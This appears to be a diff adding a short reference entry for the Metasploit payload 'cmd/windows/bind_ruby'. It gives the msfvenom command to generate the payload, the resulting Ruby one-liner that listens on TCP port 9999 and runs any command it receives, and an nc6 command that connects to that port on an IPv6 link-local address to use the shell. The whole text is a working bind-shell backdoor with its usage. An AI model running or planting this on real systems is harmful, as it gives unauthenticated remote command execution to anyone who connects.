@@ -1,0 +1,15 @@
+cmd/windows/bind_ruby
+
+msfvenom.bat -p cmd/windows/bind_ruby LPORT=9999
+
+ruby -rsocket -e "s=TCPServer.new(\"9999\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end"
+
+nc6 fe80::151b:3985:866c:d937 9999
+
+
+
+
+
+
+
+
